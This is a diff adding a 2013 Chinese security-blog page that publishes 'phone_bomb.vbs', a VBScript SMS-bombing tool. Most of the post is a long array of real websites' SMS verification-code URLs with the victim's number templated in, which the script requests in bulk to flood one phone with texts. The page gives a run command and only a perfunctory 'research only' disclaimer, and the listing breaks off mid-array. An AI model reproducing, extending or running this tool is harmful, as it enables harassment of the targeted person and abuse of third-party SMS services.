@@ -1,0 +1,979 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>短信炸弹，短信轰炸，利用各大网站的验证码功能批量轰炸某个号码 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="Nuclear&#39;Atk" /><meta name="description" content="短信炸弹，短信轰炸，利用各大网站的验证码功能批量轰炸某个号码。原理相当简单，就是利用各大网站的手机验证码（现在越来越多的网站要求手机注册了）功能，批量轰炸某个手机号码。前几天搜集了一些接口，写了个脚本，效果还不错，源码如下：用法相当简单，先保存为“phone_bomb.vbs”，然后 cmd 下执行： cscript phone_bomb.vbs，以上代码仅作技术研究用！请勿用作任何非法用途！否则后果自负！" />
+<meta name="keywords" content="短信炸弹，短信轰炸，利用各大网站的验证码功能批量轰炸某个号码" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/3860/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="短信炸弹，短信轰炸，利用各大网站的验证码功能批量轰炸某个号码" />
+<meta property="og:description" content="短信炸弹，短信轰炸，利用各大网站的验证码功能批量轰炸某个号码。原理相当简单，就是利用各大网站的手机验证码（现在越来越多的网站要求手机注册了）功能，批量轰炸某个手机号码。前几天搜集了一些接口，写了个脚本，效果还不错，源码如下：用法相当简单，先保存为“phone_bomb.vbs”，然后 cmd 下执行： cscript phone_bomb.vbs，以上代码仅作技术研究用！请勿用作任何非法用途！否则后果自负！" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/3860/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2013-09-12T10:33:42&#43;08:00" />
+<meta property="article:modified_time" content="2013-09-12T10:39:07&#43;08:00" />
+
+<meta itemprop="name" content="短信炸弹，短信轰炸，利用各大网站的验证码功能批量轰炸某个号码">
+<meta itemprop="description" content="短信炸弹，短信轰炸，利用各大网站的验证码功能批量轰炸某个号码。原理相当简单，就是利用各大网站的手机验证码（现在越来越多的网站要求手机注册了）功能，批量轰炸某个手机号码。前几天搜集了一些接口，写了个脚本，效果还不错，源码如下：用法相当简单，先保存为“phone_bomb.vbs”，然后 cmd 下执行： cscript phone_bomb.vbs，以上代码仅作技术研究用！请勿用作任何非法用途！否则后果自负！"><meta itemprop="datePublished" content="2013-09-12T10:33:42&#43;08:00" />
+<meta itemprop="dateModified" content="2013-09-12T10:39:07&#43;08:00" />
+<meta itemprop="wordCount" content="2384">
+<meta itemprop="keywords" content="短信,号码,批量,网站,验证码,360,API,app,ASP,CGI,CIA,Cmd,Html,HTTP,IE,IP,js,JSON,Jsp,NDS,Net,PHP,QQ,Rat,URL,VB,VBS,Web,手机," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="短信炸弹，短信轰炸，利用各大网站的验证码功能批量轰炸某个号码"/>
+<meta name="twitter:description" content="短信炸弹，短信轰炸，利用各大网站的验证码功能批量轰炸某个号码。原理相当简单，就是利用各大网站的手机验证码（现在越来越多的网站要求手机注册了）功能，批量轰炸某个手机号码。前几天搜集了一些接口，写了个脚本，效果还不错，源码如下：用法相当简单，先保存为“phone_bomb.vbs”，然后 cmd 下执行： cscript phone_bomb.vbs，以上代码仅作技术研究用！请勿用作任何非法用途！否则后果自负！"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">短信炸弹，短信轰炸，利用各大网站的验证码功能批量轰炸某个号码</h1>
+      
+      <div class="post-meta">
+        <time datetime="2013-09-12" class="post-time">
+          2013-09-12
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/%E7%9F%AD%E4%BF%A1/"> 短信 </a>
+            <a href="https://lcx.cc/categories/%E5%8F%B7%E7%A0%81/"> 号码 </a>
+            <a href="https://lcx.cc/categories/%E6%89%B9%E9%87%8F/"> 批量 </a>
+            <a href="https://lcx.cc/categories/%E7%BD%91%E7%AB%99/"> 网站 </a>
+            <a href="https://lcx.cc/categories/%E9%AA%8C%E8%AF%81%E7%A0%81/"> 验证码 </a>
+            
+          </div>
+        <span class="more-meta"> 约 2384 字 </span>
+          <span class="more-meta"> 预计阅读 5 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<p style="text-indent:2em;">
+	短信炸弹，短信轰炸。
+</p>
+<p style="text-indent:2em;">
+	原理相当简单，就是利用各大网站的手机验证码（现在越来越多的网站要求手机注册了）功能，批量轰炸某个手机号码。
+</p>
+<p style="text-indent:2em;">
+	前几天搜集了一些接口，写了个脚本，效果还不错，源码如下：
+</p>
+<pre class="prettyprint lang-vb">'phone_bomb.vbs
+'by: Nuclear'Atk
+'blog: https://lcx.cc/
+
+function echo(s)
+    wscript.echo s
+end function
+
+function geturl(url)
+    Dim WinHttp
+    Set WinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
+    WinHttp.Open "GET", url, False
+    WinHttp.Send
+    geturl = "status = " &amp; WinHttp.Status &amp; ", size = " &amp; len(WinHttp.ResponseText)
+    'geturl = geturl &amp; vbcrlf &amp; WinHttp.ResponseText
+end function
+
+'--------------------------------------------------------------------------------------------------
+
+Dim api, x, i
+
+api = Array("http://member.1688.com//member/ajax/send_identity_code_by_mobile.do?callback=jQuery172007067019236274064_1376100939244&amp;mobile=%phone_number%&amp;area=86&amp;isBizMobile=true", _
+            "https://affiliate-program.amazon.com/gp/associates/apply/assoc-ivs.html?phoneNumber=%2B86%phone_number%&amp;operation=start&amp;ts=1376044348191", _
+            "http://authleqr.sdo.com/lars/send-login-validate-code.jsaonp?callback=jQuery16206594030656120524_1341237419373&amp;userId=%phone_number%", _
+            "http://member.tiancity.com/handler/GetPhoneRegAuthCodeHandler.ashx?a=135&amp;userid=%phone_number%", _
+            "https://affiliate-program.amazon.com/gp/associates/apply/assoc-ivs.html?phoneNumber=%2B86%phone_number%&amp;operation=start&amp;ts=1376099658512", _
+            "http://i.360.cn/smsApi/sendsmscode?account=%phone_number%&amp;condition=2&amp;r=0.8326570473673853&amp;callback=QiUserJsonP1354551431282", _
+            "https://affiliate-program.amazon.com/gp/associates/apply/assoc-ivs.html?phoneNumber=%2B86%phone_number%&amp;operation=start&amp;ts=137606625123", _
+            "http://passport.cnyw.net//ajax.php?action=getverify&amp;mobile=%phone_number%", _
+            "http://www.kunlun.com/?act=ajax.registGetMobileCode&amp;mobile=%phone_number%&amp;type=regist", _
+            "http://www.vko.cn/sendmobile.html?phone=%phone_number%&amp;{}&amp;_=1355879411734", _
+            "http://www.66call.com/register.aspx?__EVENTTARGET=&amp;__EVENTARGUMENT=&amp;__LASTFOCUS=&amp;__VIEWSTATE=%2FwEPDwUKLTYzNzEwOTYxOA9kFgJmD2QWDAIFDw8WAh4EVGV4dAULMTU5NTAxMjgwMzZkZAIHDw8WBh8ABQblj6%2FnlKgeCENzc0NsYXNzBQ5yX2NfY19yX2NoZWNrMR4EXyFTQgICZGQCDQ8PZBYCHgV2YWx1ZQUJamlhbmdsaWxpZAIPDw8WBh8ABQbpgJrov4cfAQUOcl9jX2Nfcl9jaGVjazEfAgICZGQCEQ8PZBYCHwMFCWppYW5nbGlsaWQCEw8PFgYfAAUG6YCa6L%2BHHwEFDnJfY19jX3JfY2hlY2sxHwICAmRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQxJbWFnZUJ1dHRvbjEFDEltYWdlQnV0dG9uMoC6NmiwUtO9MaSDo%2BblDqWjloj5&amp;txtact=%phone_number%&amp;hidfoc=&amp;hidisOk=1&amp;txtpwd=jianglili&amp;txtrepwd=jianglili&amp;txtcode=&amp;ImageButton1.x=59&amp;ImageButton1.y=11", _
+            "https://affiliate-program.amazon.com/gp/associates/apply/assoc-ivs.html?phoneNumber=%2B86%phone_number%&amp;operation=start&amp;ts=%phone_number%", _
+            "http://register.sdo.com/gaea/SendPhoneMsg.ashx?page=REG&amp;mobile=%phone_number%", _
+            "http://wap.easou.com/sms.e?name=%e8%93%9d%e8%93%9d%e5%a4%a9%e7%a9%ba&amp;mobile=%phone_number%&amp;action=sms&amp;usid=9&amp;", _
+            "http://www.gewara.com/ajax/mobile/register.xhtml?mobile=%phone_number%&amp;captchaId=&amp;captcha=", _
+            "http://w.sohu.com/t2/tologin.do?mnd=%phone_number%&amp;qr=1", _
+            "http://www.66call.com/register.aspx?__EVENTTARGET=&amp;__EVENTARGUMENT=&amp;__LASTFOCUS=&amp;__VIEWSTATE=%2FwEPDwUKLTYzNzEwOTYxOA9kFgJmD2QWDAIFDw8WAh4EVGV4dAULMTU5NTAxMjgwMzZkZAIHDw8WBh8ABQblj6%2FnlKgeCENzc0NsYXNzBQ5yX2NfY19yX2NoZWNrMR4EXyFTQgICZGQCDQ8PZBYCHgV2YWx1ZQUJamlhbmdsaWxpZAIPDw8WBh8ABQbpgJrov4cfAQUOcl9jX2Nfcl9jaGVjazEfAgICZGQCEQ8PZBYCHwMFCWppYW5nbGlsaWQCEw8PFgYfAAUG6YCa6L%2BHHwEFDnJfY19jX3JfY2hlY2sxHwICAmRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQxJbWFnZUJ1dHRvbjEFDEltYWdlQnV0dG9uMoC6NmiwUtO9MaSDo%2BblDqWjloj5&amp;txtact=%phone_number%&amp;hidfoc=&amp;hidisOk=1&amp;txtpwd=zhasini&amp;txtrepwd=zhasini&amp;txtcode=&amp;ImageButton1.x=59&amp;ImageButton1.y=11", _
+            "http://wap.dm.10086.cn/X/o/3455101/447117/mva0?a=/enduser/querySMSValiCodeByWap20.action&amp;templateDir=template&amp;theme=simple&amp;name=querySMSValiCode&amp;id=querySMSValiCode&amp;downId=&amp;operateType=1&amp;isPass=true&amp;user.accountName=%phone_number%&amp;Submit=%E4%B8%8B%E4%B8%80%E6%AD%A5", _
+            "http://a.10086.cn/pams2/s/s.do?c=204&amp;j=l&amp;lpt=1&amp;mobile=%phone_number%&amp;p=72", _
+            "http://read.10086.cn/www/firstpage/getValidateCode.action?phone=%phone_number%&amp;sf=0", _
+            "http://read.10086.cn/www/NiceNameAjax?msisdn=%phone_number%&amp;e_cm=cmmobile", _
+            "https://cmpay.10086.cn/service/send_chk_no.xhtml?REG_MBL_NO=%phone_number%&amp;SMS_CD=URM001&amp;typ=Y&amp;r=0.9636801626045905", _
+            "https://feixin.10086.cn/account/RegisterLv3Ajax?stype=m&amp;stext=%phone_number%", _
+            "http://my.feixin.10086.cn/password/findpasswordvalidate?type=0&amp;account=%phone_number%", _
+            "http://218.206.191.106/idm/usermgr/usernameCheck?mobilePhone=%phone_number%", _
+            "http://go.10086.cn/index.do?method=doReg&amp;mobile=%phone_number%&amp;source=reg", _
+            "http://www.keepc.com/registerForMobileForCode.act?mobileNo=%phone_number%", _
+            "http://wap.cmread.com/sso/oauth2/msisdnRegister?e_l=1&amp;amp;f=7718&amp;amp;pg=221&amp;msisdn=%phone_number%&amp;passwd=1415926", _
+            "https://passport.jd.com/emReg/isMobileEngaged?mobile=%phone_number%&amp;r=0.08241349037594953", _
+            "http://shoujibao.net/pams2/m/s.do?j=l&amp;c=31879&amp;p=73&amp;mobile=%phone_number%&amp;password=1415926", _
+            "http://www.huggieshappyclub.com/Handler/Vcode.ashx?mobile=%phone_number%", _
+            "http://wap.buidq.com/wap/webcallService.aspx?tel=%phone_number%", _
+            "http://www.uwewe.com/get/IsUser.aspx?phone=%phone_number%&amp;quhao=86", _
+            "http://www.uwewe.com/get/SendMessage.aspx?phone=%phone_number%&amp;ccode=86&amp;type=1", _
+            "http://www.66call.com/forgetpwd.aspx?ScriptManager1=UpdatePanel1|ImageButton2&amp;__EVENTTARGET=&amp;__EVENTARGUMENT=&amp;__VIEWSTATE=%2FwEPDwULLTExMjY2ODE5MTgPFgYeCFRpbWVTcGFuBqpmMwD38M%2BIHgRjb2RlBQQ0MjY1HgRhY2N0BQsxNTgzODgwMjA0MmQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgMFDEltYWdlQnV0dG9uMgUMSW1hZ2VCdXR0b24xBQxJbWFnZUJ1dHRvbjPdI0AXCiz2XIYks0CPZpmkSSEMDg%3D%3D&amp;txtacct=%phone_number%&amp;txtcode=7426&amp;txtpwd=&amp;txtrepwd=&amp;ImageButton2.x=76&amp;ImageButton2.y=18", _
+            "http://www.wcall.net/ajax/send_captcha.jsp?mobile=86%phone_number%", _
+            "http://www.uwewe.com/wap/reg.aspx?__VIEWSTATE=%2FwEPDwUKLTg3MDQ4MjcyNGRkTWAEkK5GOtWg8l1At7LuQLJsrtk%3D&amp;__EVENTVALIDATION=%2FwEWBwLf79jTDQL7h7XWDwKd%2B7q4BwLinreAAgLChPzDDQK7q7GGCAKM54rGBiIS9Dt7i1j1h%2BDtH9EcyHIWJVZf&amp;txtacct=%phone_number%&amp;txtpwd=&amp;txtRepwd=&amp;txtCode=&amp;Button2=%E8%AF%AD%E9%9F%B3%E8%8E%B7%E5%8F%96%E9%AA%8C%E8%AF%81%E7%A0%81http://www.gewara.com/ajax/mobile/register.xhtml?mobile=%phone_number%&amp;captchaId=&amp;captcha=", _
+            "http://www.gewara.com/checkMember.xhtml?tag=mobile&amp;itemvalue=%phone_number%", _
+            "http://www.dianping.com/ajax/json/account/reg/mobile/send?m=%phone_number%", _
+            "http://www.ushi.com/openRegU!checkNumber.jhtml?basicProfile.mobile=%phone_number%", _
+            "http://www.efala.net/newfindpwbysms.flow?byname=%phone_number%", _
+            "http://zj.189.cn/zjpr/member/authentication/sendValidatePhone.html?phone=%phone_number%", _
+            "http://weibo.com/signup/v5/formcheck?type=mobile&amp;value=%phone_number%&amp;__rnd=1363496469546", _
+            "http://api.open.uc.cn/cas/register/mobi/resendVCode?uc_param_str=einisivelafrpf&amp;client_id=20033&amp;from=cas&amp;mobi=%phone_number%", _
+            "http://ptlogin.4399.com/ptlogin/sendRegPhoneCode.do?phone=%phone_number%&amp;appId=www_home&amp;v=1&amp;v=1", _
+            "http://i.youku.com/u/bindMobile?__rt=1&amp;__ro=&amp;mobile=%phone_number%", _
+            "https://safe.renren.com/actions/changesafemobile/sendmobilecaptcha?ajax-type=json&amp;token=1ZhR7iv65SgaNXliuA7mujgTO3s3k1CL&amp;mobile=%phone_number%&amp;requestToken=496404876&amp;_rtk=e95787e6", _
+            "http://service.zol.com.cn/user/ajax/sendMsgCode.php?phone=%phone_number%", _
+            "https://login.vancl.com/login/BeginRegister.ashx?action=sendmobilecode&amp;key=%phone_number%&amp;validatecode=&amp;_=1363498730859", _
+            "http://passport.eastmoney.com/chkphone.aspx?flag=check&amp;param=%phone_number%", _
+            "http://passport.eastmoney.com/chkphone.aspx?flag=resend&amp;param=%phone_number%", _
+            "http://passport.cntv.cn/mobileRegister.do?msisdn=%phone_number%&amp;verfiCodeType=1&amp;method=getRequestVerifiCode", _
+            "http://register.zhenai.com/register/validateMobile.jsps?mobile=%phone_number%", _
+            "http://reg.jiayuan.com/libs/xajax/reguser.server.php?processSendOrUpdateMessage&amp;xajax=processSendOrUpdateMessage&amp;xajaxargs%5B%5D=%3Cxjxquery%3E%3Cq%3Emobile%3Dd$%3C%2Fq%3E%3C%2Fxjxquery%3E&amp;xajaxargs%5B%5D=mobile&amp;xajaxr=1363500615734", _
+            "https://passport.jd.com/emReg/sendMobileCode?mobile=%phone_number%&amp;r=0.9010949897739119", _
+            "https://member.suning.com/emall/SNCellPhoneRegisterCmd?actionType=reSendValCode&amp;logonId=%phone_number%&amp;URL=SNUserRegisterComfirmView&amp;_=1363500974671", _
+            "http://account.iqiyi.com/security/secret/mobile/adm.action?time=1363501090218&amp;mobile=%phone_number%", _
+            "http://www.skywldh.com/registerForMobileForCode.act?mobileNo=%phone_number%&amp;smSecurityCode=", _
+            "http://wap.skywldh.com/index.php?register&amp;flag=flag&amp;phone=%phone_number%&amp;mss=on", _
+            "http://zg51.net/web/customer/forgetPwd_up.asp?customermobile=%phone_number%&amp;verify=01f735f97f1af959&amp;checkcodeflag=1", _
+            "http://www.qqvoice.com/free/getExpCode.do?_isAjaxRequest=true&amp;phonemail=%phone_number%&amp;type=1&amp;randvalue=", _
+            "http://www.feiin.com/findAccountInfoByAccount.act?mobile=%phone_number%", _
+            "http://wap.feiin.cn/index.php?register?phone=%phone_number%", _
+            "http://www.feiin.cn/bindMobileCode.act?account=%phone_number%&amp;quhao=0086", _
+            "http://www.139talk.com/user/regnum.html?phone=%phone_number%&amp;type=1&amp;key=ofoedsv0oeg6aari1m3ig0nsc5", _
+            "http://www.139talk.com/invite/invitesms.html?phone=%phone_number%&amp;key=ofoedsv0oeg6aari1m3ig0nsc5", _
+            "http://www.139talk.com/invite/regnum.html?phone=%phone_number%&amp;type=1&amp;key=ofoedsv0oeg6aari1m3ig0nsc5", _
+            "http://www.139talk.com/invite/register.html?p=cGhvbmV8MTU4Mzg4MDIwNDJ8Y2hrY29kZXw4OTczfGRhdGV8MjAxMy0wMy0xNw==", _
+            "http://www.139talk.com/download/smsdownload.html?popPhone=%phone_number%&amp;phoneType=Iphone&amp;popKey=ofoedsv0oeg6aari1m3ig0nsc5", _
+            "http://www.159talk.com/user/regnum.html?phone=%phone_number%&amp;type=1&amp;key=h5u9albk8oveqm17rfo6kvo226", _
+            "http://my.tv.sohu.com/user/reg/getmstatus.do?passport=%phone_number%", _
+            "http://sso.letv.com/user/mobileRegCode/mobile/%phone_number%/mobilecodeletvid/k961601363512388", _
+            "http://register.sdo.com/gaea/SendPhoneMsg.ashx?page=REG&amp;mobile=%phone_number%", _
+            "http://download.feixin.10086.cn/download/downloadFLToMobile.action?id=50&amp;no=%phone_number%&amp;isCheckCode=1", _
+            "http://my.feixin.10086.cn/password/sendfindpasswordsms?MobileNo=%phone_number%", _
+            "http://f.10086.cn/im5/register/checkMobile.action?mobileNo=%phone_number%", _
+            "http://zc.qq.com/cgi-bin/bd/send_sms?acc=%phone_number%&amp;bkn=1656136920&amp;v=0.6187287989762199", _
+            "http://weibo.com/signup/v5/formcheck?type=sendsms&amp;value=%phone_number%&amp;__rnd=1364610012046http://hm.baidu.com/hm.gif?cc=1&amp;ck=1&amp;cl=16-bit&amp;ds=1280x800&amp;ep=%E8%8E%B7%E5%8F%96%E9%AA%8C%E8%AF%81%E7%A0%81*%E7%82%B9%E5%87%BB&amp;et=4&amp;fl=11.6&amp;ja=1&amp;ln=zh-cn&amp;lo=0&amp;nv=1&amp;rnd=2125197633&amp;si=4cd143d67831005438c65f586314c582&amp;st=3&amp;su=http://club.autohome.com.cn%2Fbbs%2Fthread-c-148-2031217-1.html&amp;v=1.0.40&amp;lv=1&amp;api=8_0&amp;tt=%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C_%E6%B1%BD%E8%BD%A6%E4%B9%8B%E5%AE%B6", _
+            "https://www.qianwang365.com/uc/ajax/obtainSecurityCode4Regist.html?username=%phone_number%", _
+            "http://www.efala.net/getcode.flow?phone=%phone_number%&amp;cardno=&amp;code=&amp;", _
+            "http://passport.wanmei.com/NoteAction.do?method=sendRegCode&amp;mobile=%phone_number%", _
+            "http://biz.b2b.cn/member/SendCode.ashx?temptime=1365067755281&amp;m=%phone_number%", _
+            "http://www.kunlun.com/index.php?act=ajax.checkUsername&amp;user_name=%phone_number%", _
+            "http://reg.email.163.com/unireg/call.do?cmd=added.mobileverify.sendAcode&amp;mobile=%phone_number%&amp;uid=%phone_number%%40163.com&amp;mark=mobile_start", _
+            "http://passport.eastmoney.com/chkphone.aspx?flag=resend&amp;param=%phone_number%", _
+            "http://user.syyx.com/ajax/users/checkusername.aspx?u=%phone_number%&amp;r=0.42031912299903756", _
+            "http://www.keepc.com/findAccountInfoByAccount.act?mobile=%phone_number%", _
+            "http://service.zol.com.cn/user/ajax/sendMsgCode.php?phone=%phone_number%", _
+            "http://gwpassport2.woniu.com/v2/checkusername?jsoncallback=jQuery172013263149083391296_1365068016801&amp;username=%phone_number%&amp;_=1365068030671", _
+            "http://passport.upaidui.com/mobiles/send_validation_code?mobile_number=%phone_number%", _
+            "http://user.51wan.com/reg_index_check_0.html?type=username&amp;is=mobile&amp;username=%phone_number%", _
+            "http://interface.game.renren.com/ActivityCenter/?catalog=plugins&amp;gameid=all&amp;aname=reg&amp;method=reg.subUserInfo&amp;mobile=%phone_number%&amp;callback=jQuery17204292543791520399_1365068164751&amp;_=1365068180406", _
+            "http://my.xoyo.com/register/NewIsExist/?uid=%phone_number%", _
+            "http://member.tiancity.com/handler/GetPhoneRegAuthCodeHandler.ashx?a=0.016777698590329404&amp;userid=%phone_number%", _
+            "http://member.changyou.com/register/checkPhoneIsUsed.do?securityPhone=%phone_number%", _
+            "http://www.game5.com/member/sendRegisterVerifyCode?reg_mobile=%phone_number%", _
+            "http://passport.kongzhong.com/acc.do?m=sendPhoneVcodeFast&amp;callback=jQuery17200752385214847075_1364445730228&amp;phone=%phone_number%&amp;smsvcode=%E8%BE%93%E5%85%A5%E6%89%8B%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81&amp;_=1364445764320", _
+            "http://www.pceggs.com/myaccount/mobile_ajax.aspx?refresh=0&amp;i_mobileNo=%phone_number%", _
+            "http://www.9dapai.com/SMSAuthentication/SMSAuthenticationPage.aspx/btnGenerateCheckCode_Click?(Content)=%7Bcellnum%3A'%phone_number%'%7D", _
+            "http://www.veryzhun.com/ajax/register.asp?mobile=%phone_number%&amp;areacode=86", _
+            "http://wap.callda.com/register_2.jsp?phoneNumber=%phone_number%", _
+            "http://www.200call.com/index.php?action=vphone?uphone=%phone_number%", _
+            "http://wap.12580call.cn/index.php?register&amp;phone=%phone_number%", _
+            "http://w.yunpan.360.cn/intf.php?method=Sms.issue&amp;qid=177256015&amp;devtype=box&amp;v=1.9.2.1245&amp;devid=5b5b55bfc9f1f3113963b1f1350adc65&amp;devname=&amp;rtick=6969759&amp;sign=aa8d029e8036f3f9d555956388dc4c57&amp;ofmt=xml&amp;pid=home&amp;mobile=%phone_number%&amp;contype=mdu&amp;token=3708649921.6.95535003.177256015.1366401362", _
+            "http://member.tiancity.com/handler/GetPhoneRegAuthCodeHandler.ashx?a=0.6334787302703851&amp;userid=%phone_number%", _
+            "http://passport.eastmoney.com/chkphone.aspx?flag=resend&amp;param=%phone_number%", _
+            "http://passport.17u.cn/Member/RegisterHandler.ashx?action=phone&amp;phone=%phone_number%&amp;iid=0.6011805873638694", _
+            "http://3g.163.com/t/signup.do?mobile=%phone_number%&amp;sub=%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81%E7%9F%AD%E4%BF%", _
+            "http://m.mail.163.com/reg.s?regtype=mobile&amp;method=registerMobile&amp;mobile_num=%phone_number%&amp;password=testtest&amp;password2=testtest&amp;action=%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C%E4%BF%A1%E6%81%AF=400", _
+            "http://account.jzyx.com/common/send-sms.html?tel=%phone_number%", _
+            "http://t.sdo.com/home/SendSms?mobile=%phone_number%", _
+            "http://txz.sdo.com/common/msgsend/?m=%phone_number%&amp;t=2&amp;method=SendAPPDownLoadSMSCallback&amp;fromid=weblogin&amp;r=0.9407026621045355", _
+            "https://mcas.sdo.com/authen/checkAccountType.jsonp?callback=checkAccountType_JSONPMethod&amp;inputUserId=%phone_number%", _
+            "http://authleqr.sdo.com/lars/check-account-types.jsonp?callback=jQuery16202903677772887056_1353757072377&amp;userId=%phone_number%&amp;_=1353757193062", _
+            "https://reg.95538.cn/userreg/AjaxHandler.ashx?method=getPhoneCode?mobilePhone=%phone_number%&amp;type=0", _
